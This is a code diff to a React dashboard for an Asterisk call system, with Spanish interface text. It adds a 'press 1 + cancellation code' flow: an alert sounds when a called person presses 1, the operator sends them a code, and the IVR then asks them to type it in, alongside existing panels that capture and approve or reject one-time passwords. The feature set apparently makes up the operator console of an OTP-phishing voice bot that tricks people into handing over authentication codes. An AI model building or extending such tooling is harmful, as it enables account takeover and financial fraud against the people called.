@@ -21,6 +21,7 @@ import {
   Copy,
   XCircle,
   BellRing,
+  Send,
 } from 'lucide-react';
 
 export interface LiveCallItem {
@@ -36,6 +37,7 @@ export interface LiveCallItem {
     | 'talking'
     | 'on_hold'
     | 'pressed_1'
+    | 'asking_cancel_code'
     | 'otp_valid'
     | 'otp_invalid'
     | 'transferred'
@@ -130,8 +132,10 @@ export const LiveCallsTab: React.FC<LiveCallsTabProps> = ({
   const [copiedKey, setCopiedKey] = useState<string | null>(null);
   const [soundEnabled, setSoundEnabled] = useState<boolean>(true);
   const [showAllOtpHistory, setShowAllOtpHistory] = useState<boolean>(false);
+  const [sendingCancelNum, setSendingCancelNum] = useState<string | null>(null);
 
   const seenPendingKeysRef = useRef<Set<string>>(new Set());
+  const seenCancelPress1Ref = useRef<Set<string>>(new Set());
   const initialOtpLoadRef = useRef<boolean>(true);
 
   const playOtpAlertChime = () => {
@@ -157,11 +161,48 @@ export const LiveCallsTab: React.FC<LiveCallsTabProps> = ({
     } catch (_) {}
   };
 
-  // Sync live calls directly from centralized polling in App.tsx
+  const playCancelPress1Chime = () => {
+    if (!soundEnabled || typeof window === 'undefined') return;
+    try {
+      const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
+      if (!AudioCtx) return;
+      const ctx = new AudioCtx();
+      const now = ctx.currentTime;
+      [587.33, 783.99, 1046.5].forEach((freq, idx) => {
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = 'triangle';
+        osc.frequency.setValueAtTime(freq, now + idx * 0.11);
+        gain.gain.setValueAtTime(0.08, now + idx * 0.11);
+        gain.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.11 + 0.22);
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.start(now + idx * 0.11);
+        osc.stop(now + idx * 0.11 + 0.24);
+      });
+      setTimeout(() => ctx.close().catch(() => {}), 750);
+    } catch (_) {}
+  };
+
+  // Sync live calls directly from centralized polling in App.tsx & alert on Press-1 Cancel Code
   useEffect(() => {
     if (Array.isArray(globalLiveCalls)) {
       setLiveCalls(globalLiveCalls);
       setLastUpdated(globalLiveCallsUpdatedAt ? new Date(globalLiveCallsUpdatedAt) : new Date());
+      const cancelPress1Calls = globalLiveCalls.filter(
+        (c) => c.status === 'pressed_1' && c.mode === 'cancel_code' && !c.capturedOtp
+      );
+      let hasNewPress1 = false;
+      cancelPress1Calls.forEach((c) => {
+        const key = `${c.id || c.number}_press1_cancel`;
+        if (!seenCancelPress1Ref.current.has(key)) {
+          seenCancelPress1Ref.current.add(key);
+          hasNewPress1 = true;
+        }
+      });
+      if (hasNewPress1) {
+        playCancelPress1Chime();
+      }
     }
   }, [globalLiveCalls, globalLiveCallsUpdatedAt]);
 
@@ -479,6 +520,49 @@ export const LiveCallsTab: React.FC<LiveCallsTabProps> = ({
     } catch (_) {}
   };
 
+  const handleNotifyCancelCodeSent = async (call: LiveCallItem) => {
+    setSendingCancelNum(call.number);
+    try {
+      const res = await fetch('/api/asterisk/call/cancel-code-sent', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          number: call.number,
+          agent: call.agent && call.agent !== 'ringall' ? call.agent : undefined,
+        }),
+      });
+      const data = await res.json().catch(() => ({}));
+      if (res.ok && data.success) {
+        setLiveCalls((prev) =>
+          prev.map((c) =>
+            c.id === call.id || c.number === call.number
+              ? {
+                  ...c,
+                  status: 'asking_cancel_code',
+                  statusText: 'Solicitando al cliente digitar el código',
+                }
+              : c
+          )
+        );
+        setFeedbackMsg({
+          text: `✓ Señal enviada para ${call.number}: Asterisk le está pidiendo al cliente que digite el código de cancelación.`,
+          type: 'success',
+        });
+        if (onRefreshLiveTelemetry) onRefreshLiveTelemetry();
+      } else {
+        setFeedbackMsg({
+          text: data.error || 'No se pudo indicar a Asterisk que pida el código.',
+          type: 'error',
+        });
+      }
+    } catch (_) {
+      setFeedbackMsg({ text: 'Error de conexión al notificar código enviado.', type: 'error' });
+    } finally {
+      setSendingCancelNum(null);
+      setTimeout(() => setFeedbackMsg(null), 4500);
+    }
+  };
+
   // Scope visible extensions by tenant / assignedExtensions when not SuperAdmin
   const visibleExtensions = extensions.filter((ext) => {
     if (isSuperAdmin) return true;
@@ -500,6 +584,7 @@ export const LiveCallsTab: React.FC<LiveCallsTabProps> = ({
       filterStatus === 'ivr' &&
       c.status !== 'in_ivr' &&
       c.status !== 'pressed_1' &&
+      c.status !== 'asking_cancel_code' &&
       c.status !== 'otp_valid' &&
       c.status !== 'otp_invalid'
     )
@@ -507,7 +592,7 @@ export const LiveCallsTab: React.FC<LiveCallsTabProps> = ({
     if (
       filterStatus === 'otp_pending' &&
       !(c.capturedOtp && c.otpStatus === 'pending') &&
-      !(c.mode === 'otp_press1' && c.status === 'pressed_1')
+      !((c.mode === 'otp_press1' || c.mode === 'cancel_code') && (c.status === 'pressed_1' || c.status === 'asking_cancel_code'))
     )
       return false;
     if (filterStatus === 'ringing' && c.status !== 'ringing' && c.status !== 'dialing') return false;
@@ -527,12 +612,19 @@ export const LiveCallsTab: React.FC<LiveCallsTabProps> = ({
   const talkingCount = liveCalls.filter((c) => (c.status === 'talking' || c.status === 'transferred') && !c.isOnHold).length;
   const holdCount = liveCalls.filter((c) => c.isOnHold || c.status === 'on_hold').length;
   const ivrCount = liveCalls.filter(
-    (c) => c.status === 'in_ivr' || c.status === 'pressed_1' || c.status === 'otp_valid' || c.status === 'otp_invalid'
+    (c) =>
+      c.status === 'in_ivr' ||
+      c.status === 'pressed_1' ||
+      c.status === 'asking_cancel_code' ||
+      c.status === 'otp_valid' ||
+      c.status === 'otp_invalid'
   ).length;
   const pendingOtps = otpRecords.filter((r) => r.status === 'pending');
   const decidedOtps = otpRecords.filter((r) => r.status !== 'pending');
   const pendingCallsOtpCount = liveCalls.filter(
-    (c) => (c.capturedOtp && c.otpStatus === 'pending') || (c.mode === 'otp_press1' && c.status === 'pressed_1')
+    (c) =>
+      (c.capturedOtp && c.otpStatus === 'pending') ||
+      ((c.mode === 'otp_press1' || c.mode === 'cancel_code') && (c.status === 'pressed_1' || c.status === 'asking_cancel_code'))
   ).length;
   const avgDuration =
     activeCount > 0
@@ -1054,14 +1146,17 @@ export const LiveCallsTab: React.FC<LiveCallsTabProps> = ({
                 const isHold = !!call.isOnHold || call.status === 'on_hold';
                 const isTalking = (call.status === 'talking' || call.status === 'transferred') && !isHold;
                 const isPressed1 = call.status === 'pressed_1';
+                const isAskingCancelCode = call.status === 'asking_cancel_code';
+                const isCancelCode = call.mode === 'cancel_code';
                 const isOtpValid = call.status === 'otp_valid' || call.otpStatus === 'valid';
                 const isOtpInvalid = call.status === 'otp_invalid' || call.otpStatus === 'invalid';
-                const isIvr = call.status === 'in_ivr' || isPressed1 || isOtpValid || isOtpInvalid;
+                const isIvr = call.status === 'in_ivr' || isPressed1 || isAskingCancelCode || isOtpValid || isOtpInvalid;
                 const hasInlineOtp =
                   call.mode === 'otp_press1' ||
-                  call.mode === 'cancel_code' ||
+                  isCancelCode ||
                   !!call.capturedOtp ||
                   isPressed1 ||
+                  isAskingCancelCode ||
                   isOtpValid ||
                   isOtpInvalid;
                 const cardOtpKey = `card_${call.id || call.number}_${call.capturedOtp || 'wait'}`;
@@ -1119,6 +1214,11 @@ export const LiveCallsTab: React.FC<LiveCallsTabProps> = ({
                                 IVR CAPTURA OTP
                               </span>
                             )}
+                            {isCancelCode && (
+                              <span className="px-2 py-0.5 rounded bg-amber-500/20 border border-amber-500/40 text-[10px] font-mono font-bold text-amber-300">
+                                PRESS-1 + CÓDIGO CANCELACIÓN
+                              </span>
+                            )}
                           </div>
 
                           <div className="flex items-center flex-wrap gap-2 mt-1">
@@ -1166,6 +1266,16 @@ export const LiveCallsTab: React.FC<LiveCallsTabProps> = ({
                           ) : isOtpInvalid ? (
                             <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold bg-rose-500/20 text-rose-300 border border-rose-500/50">
                               OTP RECHAZADO (REINTENTO)
+                            </span>
+                          ) : isAskingCancelCode ? (
+                            <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold bg-cyan-500/25 text-cyan-200 border border-cyan-500/50 flex items-center space-x-1">
+                              <span className="w-1.5 h-1.5 rounded-full bg-cyan-400 animate-ping"></span>
+                              <span>PIDIENDO CÓDIGO AL CLIENTE</span>
+                            </span>
+                          ) : isPressed1 && isCancelCode ? (
+                            <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold bg-amber-500/25 text-amber-200 border border-amber-500/60 flex items-center space-x-1 animate-pulse">
+                              <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-ping"></span>
+                              <span>MARCÓ 1 — ENVÍA EL CÓDIGO</span>
                             </span>
                           ) : isPressed1 ? (
                             <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold bg-indigo-500/25 text-indigo-200 border border-indigo-500/50 flex items-center space-x-1">
@@ -1287,6 +1397,45 @@ export const LiveCallsTab: React.FC<LiveCallsTabProps> = ({
                                 <span>{isOtpInvalid ? 'Rechazado ✕' : 'Rechazar'}</span>
                               </button>
                             </div>
+                          </div>
+                        ) : isCancelCode && isPressed1 ? (
+                          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-amber-500/15 border border-amber-500/50 rounded-lg p-2.5">
+                            <div className="flex items-start gap-2 text-xs font-mono text-amber-200">
+                              <BellRing className="w-4 h-4 text-amber-400 animate-bounce shrink-0 mt-0.5" />
+                              <div>
+                                <div className="font-black text-amber-300 uppercase tracking-wide">
+                                  ¡Cliente presionó 1! — Envía el código de cancelación ahora
+                                </div>
+                                <div className="text-[11px] text-amber-100/80 mt-0.5">
+                                  Asterisk está esperando en línea tras reproducir el aviso. Envíale el código al cliente y pulsa el botón para que lo digite:
+                                </div>
+                              </div>
+                            </div>
+                            <button
+                              type="button"
+                              disabled={sendingCancelNum === call.number}
+                              onClick={() => handleNotifyCancelCodeSent(call)}
+                              className="px-3.5 py-2 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-mono text-xs font-black flex items-center justify-center gap-1.5 shadow-md shadow-emerald-500/25 transition-all cursor-pointer disabled:opacity-50 shrink-0"
+                            >
+                              <Send className="w-3.5 h-3.5" />
+                              <span>
+                                {sendingCancelNum === call.number
+                                  ? 'Activando...'
+                                  : 'Ya Envié el Código → Pedir que Digite'}
+                              </span>
+                            </button>
+                          </div>
+                        ) : isAskingCancelCode ? (
+                          <div className="flex items-center justify-between gap-2 text-xs font-mono text-cyan-200">
+                            <span className="flex items-center gap-2">
+                              <Volume2 className="w-4 h-4 text-cyan-400 animate-pulse shrink-0" />
+                              <span>
+                                Solicitando al cliente digitar el código de cancelación en su teclado — Esperando dígitos...
+                              </span>
+                            </span>
+                            <span className="px-2 py-0.5 rounded bg-cyan-500/20 text-cyan-300 text-[10px] shrink-0 font-bold">
+                              ESPERANDO DÍGITOS
+                            </span>
                           </div>
                         ) : (
                           <div className="flex items-center justify-between gap-2 text-xs font-mono text-indigo-200">
